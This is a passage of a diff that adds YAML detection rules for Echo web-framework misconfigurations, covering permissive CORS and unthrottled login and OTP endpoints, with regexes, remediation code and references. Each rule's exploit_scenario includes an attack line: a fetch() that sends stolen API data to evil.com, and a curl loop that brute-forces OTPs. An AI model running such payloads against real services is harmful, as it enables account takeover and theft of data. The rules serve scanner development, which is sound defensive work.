+    pattern: AllowCredentials\s*:\s*true[\s\S]*?AllowOrigins\s*:\s*\[\s*"\*"
+    description: Credentials true with wildcard origins
+  - type: regex
+    pattern: AllowOriginFunc\s*:\s*func\s*\(\s*\w+\s+string\s*\)\s*\(\s*bool\s*,\s*error\s*\)\s*\{\s*return\s+true
+    description: Origin function always returning true
+  - type: regex
+    pattern: c\.Response\s*\(\s*\)\.Header\s*\(\s*\)\.Set\s*\(\s*"Access-Control-Allow-Origin"\s*,\s*"\*"
+    description: Manual wildcard ACAO header via Echo response
+  - type: regex
+    pattern: AllowMethods\s*:\s*\[\s*http\.Method\w+[\s\S]*?\]
+    description: All HTTP methods listed in CORS methods
+  anti_patterns:
+  - AllowOrigins\s*:\s*\[\s*"https?://[\w.-]+
+  - AllowOriginFunc[\s\S]*?allowedOrigins
+  - AllowOriginFunc[\s\S]*?slices\.Contains
+  - AllowCredentials\s*:\s*false
+  - CORSConfig\s*\{[\s\S]*?AllowOrigins\s*:\s*\[\s*"https://
+  - os\.Getenv\s*\(\s*"CORS_ORIGINS"\s*\)
+  - config\.CORS\.Origins
+  - allowedOrigins\s*:=\s*\[\s*\]string
+  - CORSWithConfig[\s\S]*?AllowOrigins\s*:\s*\[\s*"https
+  - AllowOriginFunc[\s\S]*?origin\s*==\s*"https
+  - viper.*cors\.allowed
+  - cors\.New\s*\(\s*cors\.Options
+  - strings\.HasPrefix\s*\(\s*origin.*"https
+  - isAllowedOrigin
+  - originValidator
+  bypass_variants:
+  - description: Origin validation using Contains instead of exact match
+    pattern: AllowOriginFunc[\s\S]*?strings\.Contains\s*\(\s*origin\s*,\s*"example\.com"
+  - description: CORS restrictive but preflight cache too long
+    pattern: MaxAge\s*:\s*\d{6,}
+  - description: Custom CORS middleware that does not validate origin properly
+    pattern: func\s+corsMiddleware[\s\S]*?"Access-Control-Allow-Origin"[\s\S]*?c\.Request\s*\(\s*\)\.Header\.Get\s*\(\s*"Origin"\s*\)
+  evasion_indicators:
+  - CORS configured at reverse proxy level overriding Echo settings
+  - Multiple CORS configurations for different route groups
+  - CORS origin loaded from config file with wildcard default
+  encoding_variants:
+  - type: env_default
+    pattern: os\.Getenv\s*\(\s*"CORS_ORIGIN"\s*\)[\s\S]*?if.*"".*"\*"
+  - type: config_wildcard
+    pattern: config\.GetStringSlice\s*\(\s*"cors\.origins"\s*\)[\s\S]*?default.*"\*"
+  multi_function_chain_patterns:
+  - middleware.CORS() -> all endpoints cross-origin accessible -> data theft
+  - 'AllowOrigins: [''*''] -> AllowCredentials: true -> session cookie stolen cross-origin'
+  - AllowOriginFunc -> true -> authenticated API -> credential theft
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Permissive CORS enables cross-origin data theft from authenticated sessions
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Cross-origin request from attacker's domain
+    sink: Authenticated Echo handler response
+    through: Permissive CORS configuration
+  impact: 'Permissive CORS configuration in Echo allows any website to make
+
+    cross-origin requests and read API responses. Combined with
+
+    AllowCredentials, attackers can make authenticated requests using
+
+    the victim''s session cookies. This bypasses the same-origin policy,
+
+    enabling unauthorized data access, account manipulation, and
+
+    exfiltration of sensitive API responses.
+
+    '
+  remediation: "Configure Echo CORS with explicit allowed origins:\n\n```go\npackage main\n\nimport (\n    \"github.com/labstack/echo/v4\"\
+    \n    \"github.com/labstack/echo/v4/middleware\"\n)\n\nfunc main() {\n    e := echo.New()\n\n    e.Use(middleware.CORSWithConfig(middleware.CORSConfig{\n\
+    \        AllowOrigins: []string{\n            \"https://app.example.com\",\n            \"https://admin.example.com\"\
+    ,\n        },\n        AllowMethods:     []string{echo.GET, echo.POST, echo.PUT, echo.DELETE},\n        AllowHeaders:\
+    \     []string{\"Content-Type\", \"Authorization\"},\n        AllowCredentials: true,\n        MaxAge:           3600,\n\
+    \    }))\n\n    e.Start(\":8080\")\n}\n```\n"
+  references:
+  - https://echo.labstack.com/docs/middleware/cors
+  - https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
+  - https://cwe.mitre.org/data/definitions/942.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - echo\.New\s*\(\s*\)
+    - middleware\.CORS
+    - CORSConfig
+    - CORSWithConfig
+    taint_source_indicators:
+    - c\.Request\s*\(\s*\)\.Header\.Get\s*\(\s*"Origin"\s*\)
+    taint_sink_indicators:
+    - AllowOrigins
+    - AllowOriginFunc
+    - Access-Control-Allow-Origin
+    sanitization_patterns:
+    - AllowOrigins\s*:\s*\[\s*"https://
+    - AllowOriginFunc[\s\S]*?allowedOrigins
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: 'severity_weight * confidence * (credentials_allowed ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An Echo API uses middleware.CORS() with default permissive settings.
+
+      The API serves financial data and uses JWT tokens in cookies for
+
+      auth. An attacker creates a page that fetches the victim''s account
+
+      data cross-origin. The browser sends the JWT cookie, the API
+
+      responds, and the permissive CORS allows the attacker''s page to
+
+      read the response containing account balances and transactions.
+
+      '
+    example_payload: fetch('https://api.target.com/api/v1/accounts',{credentials:'include'}).then(r=>r.json()).then(data=>new
+      Image().src='https://evil.com/log?d='+btoa(JSON.stringify(data)))
+    attacker_objective: Exfiltrate authenticated API data through permissive CORS configuration
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-ECHO-001
+    - FW-ECHO-003
+    - FW-GIN-002
+    - FW-EXPRESS-002
+- rule_id: FW-ECHO-003
+  title: Missing Rate Limiting on Authentication Endpoints in Echo
+  description: 'Detects Echo applications that have login, registration, password reset, or OTP verification endpoints without
+    rate limiting middleware. Without rate limiting, these endpoints are vulnerable to brute-force attacks, credential stuffing,
+    account enumeration, and denial of service. Authentication endpoints are prime targets for automated attacks and require
+    explicit rate limiting to be secure.
+
+    '
+  language: go
+  category: framework_misuse
+  severity: High
+  confidence: 0.84
+  cwe: CWE-307
+  owasp: A07:2021-Identification and Authentication Failures
+  tags:
+  - echo
+  - rate-limiting
+  - brute-force
+  - authentication
+  - credential-stuffing
+  - go
+  detection_layer: 4
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: \.POST\s*\(\s*"[^"]*login[^"]*"\s*,\s*\w+\s*\)(?![\s\S]*?RateLimiter)
+    description: Login endpoint without rate limiting
+  - type: regex
+    pattern: \.POST\s*\(\s*"[^"]*signin[^"]*"\s*,\s*\w+\s*\)(?![\s\S]*?RateLimiter)
+    description: Sign-in endpoint without rate limiting
+  - type: regex
+    pattern: \.POST\s*\(\s*"[^"]*register[^"]*"\s*,\s*\w+\s*\)(?![\s\S]*?RateLimiter)
+    description: Registration endpoint without rate limiting
+  - type: regex
+    pattern: \.POST\s*\(\s*"[^"]*password[^"]*reset[^"]*"\s*,\s*\w+\s*\)(?![\s\S]*?RateLimiter)
+    description: Password reset endpoint without rate limiting
+  - type: regex
+    pattern: \.POST\s*\(\s*"[^"]*otp[^"]*"\s*,\s*\w+\s*\)(?![\s\S]*?RateLimiter)
+    description: OTP endpoint without rate limiting
+  - type: regex
+    pattern: \.POST\s*\(\s*"[^"]*verify[^"]*"\s*,\s*\w+\s*\)(?![\s\S]*?RateLimiter)
+    description: Verification endpoint without rate limiting
+  - type: regex
+    pattern: \.POST\s*\(\s*"[^"]*token[^"]*"\s*,\s*\w+\s*\)(?![\s\S]*?RateLimiter)
+    description: Token endpoint without rate limiting
+  - type: regex
+    pattern: \.POST\s*\(\s*"[^"]*auth[^"]*"\s*,\s*\w+\s*\)(?![\s\S]*?RateLimiter)
+    description: Auth endpoint without rate limiting
+  anti_patterns:
+  - middleware\.RateLimiter\s*\(
+  - middleware\.RateLimiterWithConfig\s*\(
+  - RateLimiterConfig\s*\{
+  - rate\.NewLimiter\s*\(
+  - limiter\.Allow\s*\(\s*\)
+  - tollbooth
+  - ulule/limiter
+  - throttle
+  - ratelimit\.\w+
+  - x/time/rate
+  - redis.*rate.*limit
+  - slidingWindowRateLimiter
+  - tokenBucket
+  - leakyBucket
+  - failedLoginAttempts
+  bypass_variants:
+  - description: Rate limiter on IP but not on username (credential stuffing)
+    pattern: RateLimiterConfig[\s\S]*?IdentifierExtractor[\s\S]*?RealIP(?![\s\S]*?FormValue)
+  - description: Rate limiter too generous for auth endpoints
+    pattern: RateLimiterConfig[\s\S]*?Rate\s*:\s*rate\.Limit\s*\(\s*\d{3,}
+  - description: Rate limiter resets too quickly
+    pattern: RateLimiterConfig[\s\S]*?ExpiresIn\s*:\s*time\.Second\s*\*\s*[1-5]\s*
+  evasion_indicators:
+  - Rate limiting at API gateway level but not at application level
+  - IP-based rate limiting bypassed via X-Forwarded-For spoofing
+  - Rate limiter on main login but not on alternative auth endpoints
+  encoding_variants:
+  - type: distributed_bypass
+    pattern: c\.RealIP\s*\(\s*\)[\s\S]*?rateLimiter
+  - type: account_spray
+    pattern: for\s+_\s*,\s+user\s*:=\s*range\s+users[\s\S]*?\.POST.*login
+  multi_function_chain_patterns:
+  - POST /login -> no rate limit -> brute-force 1000 passwords/sec -> account compromise
+  - POST /password-reset -> no rate limit -> enumerate valid emails
+  - POST /otp/verify -> no rate limit -> brute-force 6-digit OTP in minutes
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Brute-force on auth endpoints enables credential compromise for any account
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Automated HTTP requests to auth endpoints
+    sink: Authentication handler comparing credentials
+    through: Unlimited request processing without rate limiting
+  impact: 'Without rate limiting on authentication endpoints, attackers can
+
+    perform brute-force attacks at thousands of attempts per second.
+
+    A 6-digit OTP can be brute-forced within minutes. Credential
+
+    stuffing attacks using leaked password databases can compromise
+
+    accounts with reused passwords. Password reset endpoints without
+
+    rate limiting enable email bombing and account enumeration.
+
+    This directly leads to account takeover.
+
+    '
+  remediation: "Add rate limiting middleware to authentication endpoints:\n\n```go\npackage main\n\nimport (\n    \"github.com/labstack/echo/v4\"\
+    \n    \"github.com/labstack/echo/v4/middleware\"\n    \"golang.org/x/time/rate\"\n    \"time\"\n)\n\nfunc main() {\n \
+    \   e := echo.New()\n\n    // Create rate limiter for auth endpoints\n    authRateLimiter := middleware.RateLimiterWithConfig(\n\
+    \        middleware.RateLimiterConfig{\n            Skipper: middleware.DefaultSkipper,\n            Store: middleware.NewRateLimiterMemoryStoreWithConfig(\n\
+    \                middleware.RateLimiterMemoryStoreConfig{\n                    Rate:      rate.Limit(5),     // 5 requests\n\
+    \                    Burst:     10,                // burst of 10\n                    ExpiresIn: 5 * time.Minute,   //\
+    \ per 5 minutes\n                },\n            ),\n            IdentifierExtractor: func(ctx echo.Context) (string,\
+    \ error) {\n                // Rate limit by IP + username combination\n                ip := ctx.RealIP()\n         \
+    \       username := ctx.FormValue(\"username\")\n                return ip + \":\" + username, nil\n            },\n \
+    \           ErrorHandler: func(context echo.Context, err error) error {\n                return context.JSON(429, map[string]string{\n\
+    \                    \"error\": \"Too many requests. Please try again later.\",\n                })\n            },\n\
+    \            DenyHandler: func(context echo.Context, identifier string, err error) error {\n                return context.JSON(429,\
+    \ map[string]string{\n                    \"error\": \"Rate limit exceeded.\",\n                })\n            },\n \
+    \       },\n    )\n\n    // Apply to auth endpoints\n    auth := e.Group(\"/auth\")\n    auth.Use(authRateLimiter)\n \
+    \   auth.POST(\"/login\", loginHandler)\n    auth.POST(\"/register\", registerHandler)\n    auth.POST(\"/password-reset\"\
+    , passwordResetHandler)\n    auth.POST(\"/otp/verify\", otpVerifyHandler)\n\n    e.Start(\":8080\")\n}\n```\n"
+  references:
+  - https://echo.labstack.com/docs/middleware/rate-limiter
+  - https://cwe.mitre.org/data/definitions/307.html
+  - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
+  - https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - \.POST\s*\(\s*"[^"]*login
+    - \.POST\s*\(\s*"[^"]*auth
+    - \.POST\s*\(\s*"[^"]*register
+    - \.POST\s*\(\s*"[^"]*password
+    taint_source_indicators:
+    - c\.FormValue\s*\(\s*"password"\s*\)
+    - c\.FormValue\s*\(\s*"username"\s*\)
+    - c\.Bind\s*\(\s*&loginRequest\s*\)
+    taint_sink_indicators:
+    - bcrypt\.CompareHashAndPassword\s*\(
+    - passwordHash\.Compare\s*\(
+    - verifyPassword\s*\(
+    sanitization_patterns:
+    - middleware\.RateLimiter
+    - rate\.NewLimiter
+    - tollbooth
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (otp_endpoint ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An Echo application has an OTP verification endpoint at
+
+      /auth/otp/verify without rate limiting. After initiating a login,
+
+      a 6-digit OTP is sent to the user''s phone. An attacker scripts
+
+      a brute-force attack trying all 1,000,000 combinations at 500
+
+      requests per second. Within 33 minutes, the attacker finds the
+
+      valid OTP and completes authentication, gaining access to the
+
+      victim''s account without their knowledge.
+
+      '
+    example_payload: for i in $(seq 000000 999999); do curl -s -X POST https://target.com/auth/otp/verify -d "otp=$i&session=abc123"
+      & done
+    attacker_objective: Brute-force authentication credentials and OTP codes through unlimited attempts
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - FW-ECHO-001
+    - FW-ECHO-002
+    - FW-GIN-001
